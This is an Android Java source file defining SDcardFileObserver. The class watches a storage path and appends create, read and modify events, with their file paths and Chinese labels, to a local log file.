package com.phone.data;

import com.main.ForegroundService;
import com.utils.WriteDateFile;
import android.os.FileObserver;
import android.util.Log;


public class SDcardFileObserver extends FileObserver {
	private final String TAG = "SDcardFileObserver";
	
	public SDcardFileObserver(String path) {
	    super(path);
	   
	}
	
	@Override
	public void onEvent(int event, String path) {
		try{
			
			event = event & FileObserver.ALL_EVENTS;
		    switch (event) {
		    
		    case android.os.FileObserver.CREATE:
		    	
		        Log.d(TAG, "file create");
				WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, ForegroundService.FILEOBSERVER_FILE_NAME, 
						"创建:" + path + "\r\n",true);
		        break;
		    /*
		    case android.os.FileObserver.OPEN:
		        Log.d("FileObserver", "file open");
				WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, ForegroundService.FILEOBSERVER_FILE_NAME, 
						"file open:" + path + "\r\n", true);
		        break;
		        */
		    case android.os.FileObserver.ACCESS:
		        Log.d(TAG, "file access");
				WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, ForegroundService.FILEOBSERVER_FILE_NAME, 
						"读取:" + path + "\r\n", true);
		        break;
		    case android.os.FileObserver.MODIFY:
		        Log.d(TAG, "file MODIFY");
				WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, ForegroundService.FILEOBSERVER_FILE_NAME, 
						"修改:" + path + "\r\n", true);
		        break;
		    }
		}catch(Exception ex){
			ex.printStackTrace();
		}
	}
}
